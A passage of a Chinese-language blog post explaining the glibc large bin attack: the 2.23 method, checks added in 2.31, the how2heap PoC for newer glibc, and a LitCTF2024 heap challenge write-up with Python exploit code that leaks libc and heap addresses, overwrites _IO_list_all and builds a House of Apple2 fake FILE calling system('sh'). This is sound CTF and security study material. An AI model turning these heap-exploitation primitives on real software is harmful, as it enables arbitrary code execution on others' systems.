+<h3 id="修改stack_var值"><a class="markdownIt-Anchor" href="#修改stack_var值"></a> 修改stack_var值</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br></pre></td></tr></table></figure>
+<p>短短三行代码其实包含了很多东西。</p>
+<p>依旧是这个malloc(0x90),p1依旧惨遭剥削，p3被扔进large_bins里。此时会对p2和p3的大小做出比较，先看看比较过程</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>((<span class="type">unsigned</span> <span class="type">long</span>)size &lt; fwd-&gt;size)&#123;</span><br><span class="line">    fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">    assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">&#125; <span class="comment">//这里检测的是从unsorted_bins里提取出的堆块是否小于large_bins里最近被释放的堆块的大小，如果小于，就将fwd向前移，也就是与比它更小的堆块对比</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line"><span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">fwd = fwd-&gt;fd;<span class="comment">//相等的话，就往后排列</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd; <span class="comment">//这里,victim是从unsorted_bin提取出来的堆块，fwd是最近被释放进large_bin的堆块，分别对应我们的p3,p2</span></span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; <span class="comment">//在此前,p2-&gt;bk_nextsize已经被我们设置为了stack_var2-0x20的地址，所以p3的bk_nextsize指向它</span></span><br><span class="line">    fwd-&gt;bk_nextsize = victim; <span class="comment">//p2-&gt;bk_nextsize指向p3</span></span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">//p3-&gt;bk_nextsize = stack_var2 - 0x20，也就是说我们已经伪造了一个堆块，(stack_var2-0x20)-&gt;fd_nexitsize就是stack_var2的地址，将该地址赋值p3的头指针</span></span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk; <span class="comment">//p2的bk我们设置成了stack_var1-0x10，所以bck成了我们stack_var1-0x10这个虚假的chunk</span></span><br></pre></td></tr></table></figure>
+<p>很显然，我们p2的0x3F0小于p3的0x510，所以会执行else里的语句，跟我注释里写的一样，为了起到明显的对比效果，我分别把修改前和修改后的截图放出来</p>
+<p>修改前的p2和p3</p>
+<p><img src="https://s2.loli.net/2024/05/29/FNeOPAimTnYzD8I.png" alt=" 2024-05-29 214003.png" /></p>
+<p>修改后的p2和p3</p>
+<p><img src="https://s2.loli.net/2024/05/29/vCMRa24h8N9PXV7.png" alt="image.png" /></p>
+<p>可以看到，我们已经把p3的bk和bk_nextsize修改成了stack_var1-0x10和stack_var2-0x20，而这两个分别对应的fd,fd_nextsize指针指向的就是我们的stack_var1,stack_var2，我们就把chunk3的头指针给输入进这两个地址内部了</p>
+<p><img src="https://s2.loli.net/2024/05/29/Z9uK1FhzQ6Lnm24.png" alt="image.png" /></p>
+<h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2>
+<p>这个攻击主要就是利用两个chunk，大的为p3,小的为p2。我们可以<strong>伪造较小堆块p2的bk和bk_nextsize</strong>，分别指向<strong>target1-0x10,target2_0x20</strong>，放进large_bins里(可以的话，large_bins在此前最好是空的)。而大堆块p3在经过malloc后放进large_bins里，将<strong>p3的头指针赋值给了target1,target2</strong>，完成了<strong>任意地址写</strong>。将p3的头指针写进target1,2里后，可以<strong>结合其它House of 系列进行攻击</strong></p>
+<h1 id="glibc-231版本的攻击方式"><a class="markdownIt-Anchor" href="#glibc-231版本的攻击方式"></a> glibc-2.31版本的攻击方式</h1>
+<h2 id="新增检测"><a class="markdownIt-Anchor" href="#新增检测"></a> 新增检测</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">       victim-&gt;fd_nextsize = fwd;</span><br><span class="line">       victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd)) <span class="comment">//以上面的p2为例的话，那就是检测stack_var2-0x20的fd_nextsize是否指向p2。是的话就报错</span></span><br><span class="line">              malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">       fwd-&gt;bk_nextsize = victim;</span><br><span class="line">       victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)<span class="comment">// 同理，如果stack_var1-0x10的fd是否指向p2，是就报错</span></span><br><span class="line">       malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>因为这个检测，我们在glibc-2.23的攻击方式算是彻底失效了，得另寻他路</p>
+<h2 id="新源码利用"><a class="markdownIt-Anchor" href="#新源码利用"></a> 新源码利用</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">assert (chunk_main_arena (bck-&gt;bk));<span class="comment">//断言bck-&gt;bk属于main_arena</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">       fwd = bck; <span class="comment">//这里的fwd可以粗略的认为是large_bin归属的main_arena</span></span><br><span class="line">       bck = bck-&gt;bk; <span class="comment">//bck成了main_arena的bk指针指向的堆块</span></span><br><span class="line">       victim-&gt;fd_nextsize = fwd-&gt;fd; <span class="comment">//我们申请的小堆块的fd_nextsize指向了main_arena的fd指针，也就是所在的large_bin的最大的堆块</span></span><br><span class="line">       victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="comment">//攻击点，没有检测，所以我们可以伪造大堆块的bk_nextsize</span></span><br><span class="line">       fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">//先进行右值运算，如果在没有进行修改的情况下，等式可以化简为fwd-&gt;fd-&gt;bk_nextsize = victim，也就是最大堆块的bk_nextsize指向我们的最小堆块victim</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这段代码与unsorted_bins、large_bins有关，这是<strong>从unsorted_bins里提取出来的堆块((unsigned long) (size))与large_bins里的最小堆块((unsigned long) chunksize_nomask (bck-&gt;bk))进行比较</strong>,如果unsorted出来的堆块更小，就执行如上操作。</p>
+<p><strong>注意，这里并没有进行检测操作！</strong>，意味着我们<strong>可以对bk_nextsize进行修改</strong>，再次<strong>实现任意地址写</strong></p>
+<h2 id="how2heap新源码及动调"><a class="markdownIt-Anchor" href="#how2heap新源码及动调"></a> how2heap新源码及动调</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In our case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟之前相比起来其实大差不差，但是中间申请的堆块从小堆块变成了大堆块(指从0x90变成了0x438)，跟前面雷同的地方我就不再演示，主要看<code>free(p2)</code>及其之后的动调</p>
+<h3 id="freep2及其后的变化"><a class="markdownIt-Anchor" href="#freep2及其后的变化"></a> free(p2)及其后的变化</h3>
+<p>在刚刚完成free(p2)的时候，堆内的结构是这样的</p>
+<p><img src="https://s2.loli.net/2024/05/30/wLGUaxXRqhMCoOP.png" alt=" 2024-05-30 155126.png" /></p>
+<p>此时还很正常，那么我们接下来修改p1的bk_nextsize</p>
+<p><img src="https://s2.loli.net/2024/06/05/lsvUaD398MOcyrf.png" alt=" 2024-05-30 155548.png" /></p>
+<p>可以看到，我们把p1的bk_nextsize修改成了target-0x20字节处的地址，我们继续往下走</p>
+<p>申请完最后一个大堆块，这是此时p2和target的变化</p>
+<p><img src="https://s2.loli.net/2024/05/30/CwxAaNnGvsTzhmy.png" alt="image.png" /><br />
+<img src="https://s2.loli.net/2024/05/30/KYXDNVhj38Spkrf.png" alt=" 2024-05-30 160119.png" /></p>
+<p>此时，我们已经完成了我们的目的，任意地址写，已经成功将p2的头指针写进了target里边，实现了large_bin_attack</p>
+<h2 id="总结-2"><a class="markdownIt-Anchor" href="#总结-2"></a> 总结</h2>
+<p>相较于旧版本的large_bin_attack，高版本的这种攻击只能实现一个地址的任意地址写，结合其他攻击方式的过程会更为繁琐。</p>
+<p>这种large_bin_attack，是申请大于p1,p2这两个堆块的堆块，来把p1,p2塞进large_bins里，没有之前的切割行为，我们只用伪造p1这个相对较大的堆块的bk_nextsize即可</p>
+<h2 id="例题-litctf2024-heap239"><a class="markdownIt-Anchor" href="#例题-litctf2024-heap239"></a> 例题 LitCTF2024 Heap2.39</h2>
+<h3 id="源代码及分析"><a class="markdownIt-Anchor" href="#源代码及分析"></a> 源代码及分析</h3>
+<p><img src="https://s2.loli.net/2024/09/07/RAXrhF49Lfi2IV6.png" alt=" 2024-09-07 162617.png" /></p>
+<p><img src="https://s2.loli.net/2024/09/07/seXDbncofmZSaMl.png" alt=" 2024-09-07 162636.png" /></p>
+<p><img src="https://s2.loli.net/2024/09/07/tsJXSHRnN5dlmEc.png" alt=" 2024-09-07 162743.png" /></p>
+<p><img src="https://s2.loli.net/2024/09/07/IKw1d8rbqRoQW3v.png" alt=" 2024-09-07 162754.png" /></p>
+<p><img src="https://s2.loli.net/2024/09/07/WZqn1QPkx4fGHV8.png" alt=" 2024-09-07 162806.png" /></p>
+<p><img src="https://s2.loli.net/2024/09/07/rpyIBXDakJ5oFLh.png" alt=" 2024-09-07 162814.png" /></p>
+<p>根据题目信息可知，这是非常高版本的堆，要用比较新型的攻击方式，而在create里限制了size的大小，典型的large_bins，还看到能主动触发exit，我们可以考虑House of Apple</p>
+<h3 id="动调过程"><a class="markdownIt-Anchor" href="#动调过程"></a> 动调过程</h3>
+<p>先创建5个堆</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">8</span>,<span class="number">0x508</span>) </span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x510</span>)  <span class="comment">#p2</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>) </span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x520</span>)  <span class="comment">#p1</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br></pre></td></tr></table></figure>
+<p>因为有UAF，所以可以据此泄露libc_base和heap_base</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x550</span>) <span class="comment">#分配2进large_bins</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content : &#x27;</span>)</span><br><span class="line">large_bin = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;large_bin==&gt;&#x27;</span>+<span class="built_in">hex</span>(large_bin))</span><br><span class="line">libc_base = large_bin - <span class="number">0x203F50</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base==&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;IO_list_all==&gt;&#x27;</span>+<span class="built_in">hex</span>(IO_list_all))</span><br><span class="line">IO_wfile_jumps = libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;IO_wfile_jumps==&gt;&#x27;</span>+<span class="built_in">hex</span>(IO_wfile_jumps))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;system==&gt;&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content : &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;heap_addr==&gt;&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">heap_base = heap_addr - <span class="number">0x11d0</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_base==&gt;&#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2024/09/07/mbE5nGKOxZhS1NL.png" alt=" 2024-09-07 191555.png" /></p>
+<p><img src="https://s2.loli.net/2024/09/07/cGxsB26DNmiEkIj.png" alt=" 2024-09-07 191608.png" /></p>
+<p>ok，泄露完这些基础条件后，就该利用large_bins_attack了，布置好堆</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(large_bin) + p64(large_bin) + p64(heap_addr) + p64(IO_list_all - <span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x550</span>)</span><br></pre></td></tr></table></figure>
+<p>这是p1和p2的原始内容,p2尚未分配进large_bins</p>
+<p><img src="https://s2.loli.net/2024/09/07/wnjQxvtWCsAb8OX.png" alt=" 2024-09-07 192304.png" /></p>
+<p>此时经过edit修改后，p2再分配进large_bins，注意观察p1和p2的内容</p>
+<p><img src="https://s2.loli.net/2024/09/07/fr1LRkiaZxyPVbS.png" alt=" 2024-09-07 192624.png" /></p>
+<p><img src="https://s2.loli.net/2024/09/07/cvAiBKH5JtrGsCw.png" alt=" 2024-09-07 192916.png" /></p>
+<p>可以很明显的看到，原本在<code>p1的bk_nextsize处的_IO_list_all-0x20转移到了p2的bk_nextsize</code>，此时，<code>我们已经向_IO_list_all写入了p2的地址</code>，接下来就是要利用p2来getshell</p>
+<p><img src="https://s2.loli.net/2024/09/07/Vsbm1d4e5M9XEIS.png" alt=" 2024-09-07 193206.png" /></p>
+<p>使用过IO攻击的师傅都知道，要伪造IO，本题也不例外，我们使用的是<code>House of Apple2的_IO_wfile_overflow函数控制执行流</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x500</span> + p32(<span class="number">0xfffff7f5</span>) + <span class="string">b&#x27;;sh\x00&#x27;</span>) </span><br><span class="line">fake_IO = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">1</span>) + p64(<span class="number">2</span>) <span class="comment">#当write_ptr&gt;write_base时，会调用overflow</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0xa0</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk + <span class="number">0x100</span>) <span class="comment">#wide_data</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0xc0</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0xffffffffffffffff</span>) <span class="comment">#mode</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0xd8</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(IO_wfile_jumps) <span class="comment">#vtable</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x100</span> - <span class="number">0x10</span> + <span class="number">0xe0</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk + <span class="number">0x200</span>) <span class="comment">#_wide_data-&gt;_wide_vtable，当write_ptr&gt;write_base且_IO_buf_base为空，会调用_IO_wdoallocbuf</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x200</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0</span>) * <span class="number">13</span> + p64(system) <span class="comment"># _wide_data-&gt;_wide_vtable-&gt;doallocate</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,fake_IO)</span><br></pre></td></tr></table></figure>
+<p>这段代码最容易迷糊的就是开头的flag位设置，首先我们通过chunk8来修改p2的prevsize位，<code>0xfffff7f5</code>的0xffff设置为<code>屏蔽高四字节</code>，意味着我们的<code>sh不会被检测</code>，<code>f7f5</code>则设置了很多状态位，不一一赘述</p>
+<p>设置好堆状态，让我们看看此时的堆排列</p>
+<p><img src="https://s2.loli.net/2024/09/07/peTwJYr6stAXHju.png" alt=" 2024-09-07 194035.png" /></p>
+<p>可以看到此时是已经设置好了的，只要我们主动触发exit即可</p>
+<p><img src="https://s2.loli.net/2024/09/07/lIFwNoqUY3ASEd4.png" alt=" 2024-09-07 194558.png" /></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Heap/" rel="tag">Heap</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="https://s2.loli.net/2024/11/29/PeBWhufwbiDtdRN.jpg" data-sizes="auto" alt="DIR-815" class="lazyload">
+          
+        
+        <a href="/2024/11/25/DIR-815/"></a>
